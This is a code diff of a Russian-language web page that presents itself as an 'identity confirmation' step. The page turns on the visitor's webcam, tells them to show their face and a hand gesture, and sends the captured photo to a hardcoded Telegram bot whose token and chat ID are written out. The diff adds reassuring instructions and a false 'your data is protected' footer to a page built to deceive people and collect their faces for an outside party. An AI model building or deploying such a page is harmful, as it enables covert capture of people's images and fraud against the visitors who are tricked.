@@ -3,67 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение</title>
+    <title>Подтверждение личности</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: system-ui, -apple-system, sans-serif;
+            text-align: center;
+            padding-top: 30px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        .sub {
+            color: #aaa;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .instruction {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            border-left: 4px solid #1e90ff;
+            text-align: left;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        .instruction span {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        video {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 16px;
+            border: 2px solid #333;
+            display: none;
+            margin: 10px auto;
+        }
+        .btn {
+            background: #1e90ff;
+            border: none;
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 16px;
+            width: 100%;
+            max-width: 280px;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #0077e6;
+        }
+        .btn:active {
+            transform: scale(0.96);
+        }
+        #status {
+            color: #888;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .hint {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 12px 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+        .hint span {
+            background: #222;
+            padding: 6px 14px;
+            border-radius: 30px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #555;
+        }
+    </style>
 </head>
-<body style="background:#0a0a0a;color:#fff;font-family:system-ui;text-align:center;padding-top:50px;">
-    <h2>Подтверждение личности</h2>
-    <p>Нажмите «Разрешить», чтобы продолжить</p>
-    <video id="video" autoplay style="width:280px;border-radius:16px;display:none;"></video>
-    <br><br>
-    <button onclick="snap()" style="background:#1e90ff;border:none;color:#fff;padding:14px 30px;border-radius:40px;font-size:18px;">📸 Отправить</button>
-    <p id="status" style="color:#888;margin-top:20px;">⏳ Ожидание...</p>
+<body>
+<div class="container">
+    <h2>🔐 Подтверждение личности</h2>
+    <p class="sub">Для завершения проверки сделайте фото</p>
 
-    <script>
-        const video = document.getElementById('video');
-        const status = document.getElementById('status');
-        let stream = null;
+    <div class="instruction">
+        <span>📌 Инструкция:</span><br>
+        1. Покажите <span>лицо</span> (чётко, при хорошем свете)<br>
+        2. Покажите <span>жест рукой</span>:<br>
+        &nbsp;&nbsp;• 🤘 (рок) <br>
+        &nbsp;&nbsp;• 👍 (палец вверх)<br>
+        3. Нажмите кнопку «Отправить»
+    </div>
 
-        const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
-        const CHAT_ID = '5025315928';
+    <div class="hint">
+        <span>🤘 Рок</span>
+        <span>👍 Палец вверх</span>
+    </div>
 
-        async function startCam() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                status.textContent = '✅ Камера активна';
-            } catch(e) {
-                status.textContent = '❌ Ошибка: ' + e.message;
-            }
+    <video id="video" autoplay playsinline></video>
+
+    <button class="btn" onclick="snap()">📸 Отправить фото</button>
+    <div id="status">⏳ Ожидание камеры...</div>
+    <div class="footer">Ваши данные защищены • Проверка занимает 5 секунд</div>
+</div>
+
+<script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    let stream = null;
+
+    // ===== ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ) =====
+    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
+    const CHAT_ID = '5025315928';
+    // ====================================
+
+    async function startCam() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            status.textContent = '✅ Камера включена, сделайте жест и нажмите "Отправить"';
+        } catch(e) {
+            status.textContent = '❌ Ошибка доступа к камере: ' + e.message;
+        }
+    }
+
+    async function snap() {
+        if (!stream) {
+            status.textContent = '❌ Камера не доступна. Разрешите доступ.';
+            return;
         }
 
-        async function snap() {
-            if (!stream) return status.textContent = '❌ Нет камеры';
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const data = canvas.toDataURL('image/png');
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
 
-            status.textContent = '📤 Отправка...';
+        ctx.fillStyle = '#ffffff30';
+        ctx.fillRect(0, 440, 640, 40);
+        ctx.fillStyle = '#fff';
+        ctx.font = '16px sans-serif';
+        ctx.fillText('Подтверждение личности', 20, 470);
 
+        const data = canvas.toDataURL('image/png');
+
+        status.textContent = '📤 Отправка...';
+
+        try {
             const blob = await fetch(data).then(r => r.blob());
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
-            form.append('photo', blob, 'shot.png');
+            form.append('photo', blob, 'face_gesture.png');
 
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: form
-                });
-                const json = await res.json();
-                if (json.ok) {
-                    status.textContent = '✅ Фото отправлено!';
-                } else {
-                    status.textContent = '❌ Ошибка: ' + json.description;
-                }
-            } catch(e) {
-                status.textContent = '❌ Ошибка сети';
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: form
+            });
+            const json = await res.json();
+            if (json.ok) {
+                status.textContent = '✅ Фото отправлено! Спасибо.';
+            } else {
+                status.textContent = '❌ Ошибка бота: ' + json.description;
             }
+        } catch(e) {
+            status.textContent = '❌ Ошибка сети. Проверьте интернет.';
         }
+    }
 
-        startCam();
-    </script>
+    startCam();
+</script>
 </body>
 </html>
